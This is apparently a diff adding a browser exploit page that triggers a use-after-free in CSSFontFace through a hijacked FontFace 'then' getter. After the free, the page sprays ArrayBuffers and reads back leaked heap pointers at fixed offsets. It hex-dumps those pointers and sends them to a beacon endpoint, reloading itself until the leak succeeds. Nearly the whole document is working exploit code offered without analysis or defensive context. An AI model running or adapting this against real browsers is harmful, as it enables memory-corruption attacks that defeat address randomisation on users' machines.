@@ -1,0 +1,189 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1215 CSSFontFace reclaim (p563 exact)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+.ok{color:#00ff88}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="s">P1215 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1215: EXACT p563 logic — CSSFontFace reclaim + heap pointer leak
+
+   Differences from P1214:
+   - NO font check stage (trust Helvetica/Arial)
+   - NO reload poller
+   - NO Bsync anywhere (all async Image)
+   - Same scan structure as p563 (done=true on first scan)
+   - Auto-retry: reload after 2s if no hit
+
+   p563 confirmed on 14.10: buffer 19, size 192, +0x58 and +0x68 heap ptrs
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+/* p563 uses sync XHR for beacons OUTSIDE the getter
+   "Every beacon is a synchronous XHR so that it leaves the
+    renderer before a possible crash in the same call."
+   Only the getter interior must be beacon-free. */
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1215-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+/* attempt counter from URL */
+var params=(location.search||'').slice(1).split('&');
+var attempt=1;
+for(var i=0;i<params.length;i++){
+  var kv=params[i].split('=');
+  if(kv[0]==='a')attempt=parseInt(kv[1],10)||1;
+}
+
+S.textContent='P1215 attempt #'+attempt+' ...';
+msg('attempt: '+attempt);
+B('START','attempt='+attempt);
+
+/* ─── p563 exact logic ─── */
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var styleEl=null;
+var firedHere=false;
+var done=false;
+
+function hex(v){return ('0'+v.toString(16)).slice(-2);}
+
+function setup(){
+  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive=[A];
+
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+
+  B('SETUP','ok');
+
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      /* CRITICAL: no operations between free and spray */
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      window.__map=[];
+      for(var si=0;si<SIZES.length;si++){
+        var size=SIZES[si];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(size);
+          window.__map.push({size:size,view:new Uint8Array(ab)});
+        }
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  B('LOAD','calling');
+  document.fonts.load('1em f0, s0','AB').then(
+    function(){B('RESOLVED','ok');},
+    function(){B('REJECTED','err');}
+  );
+
+  /* p563 timing: scan at 60ms and 400ms */
+  setTimeout(scan,60);
+  setTimeout(scan,400);
+
+  /* noscan check at 1500ms (same as p563) */
+  setTimeout(function(){
+    if(!done){
+      B('NOSCAN','fired='+firedHere);
+      msg('noscan: fired='+firedHere);
+      S.textContent='attempt #'+attempt+': NO HIT';
+      /* auto-retry: reload with next attempt number */
+      setTimeout(function(){
+        var base=location.pathname;
+        location.href=base+'?a='+(attempt+1);
+      },500);
+    }
+  },1500);
+}
+
+function scan(){
+  if(done)return;
+  var m=window.__map;
+  if(!m||!m.length)return;
+  done=true; /* p563 behavior: first scan sets done */
+
+  var out=[];
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0,first=-1;
+    for(var j=0;j<v.length;j++){
+      if(v[j]!==0){n++;if(first<0)first=j;}
+    }
+    if(n){
+      var s='';
+      var stop=Math.min(v.length,first+256);
+      for(var j=first;j<stop;j++)s+=hex(v[j]);
+      out.push('b'+i+'-s'+m[i].size+'-o'+first+'-n'+n+'-'+s);
+    }
+  }
+
+  if(!out.length){
+    B('CLEAN','a='+attempt+'|bufs='+m.length);
+    msg('scan: ALL CLEAN ('+m.length+' buffers)');
+    return;
+  }
+
+  /* HIT! */
+  var hitData=out.join('_');
+  B('HIT','a='+attempt+'|'+hitData);
+  msg('!!! HIT !!!');
+  msg(hitData);
+  S.textContent='HIT ON ATTEMPT #'+attempt+'!';
+  S.style.color='#ff00ff';
+
+  /* decode the pointers */
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>0&&m[i].size===192){
+      var p58='0x';for(var j=7;j>=0;j--)p58+=hex(v[0x58+j]);
+      var p68='0x';for(var j=7;j>=0;j--)p68+=hex(v[0x68+j]);
+      msg('+0x58 = '+p58);
+      msg('+0x68 = '+p68);
+      B('PTRS','p58='+p58+'|p68='+p68);
+
+      /* full hex dump for analysis */
+      var dump='';
+      for(var j=0;j<v.length;j++){
+        if(j%16===0)dump+='\n+'+hex(j>>4)+hex(j&0xf)+': ';
+        dump+=hex(v[j])+' ';
+      }
+      msg('hex dump:'+dump);
+      B('DUMP',dump.slice(0,900));
+    }
+  }
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(setup,0);
+else document.addEventListener('DOMContentLoaded',setup);
+</script>
+</body></html>
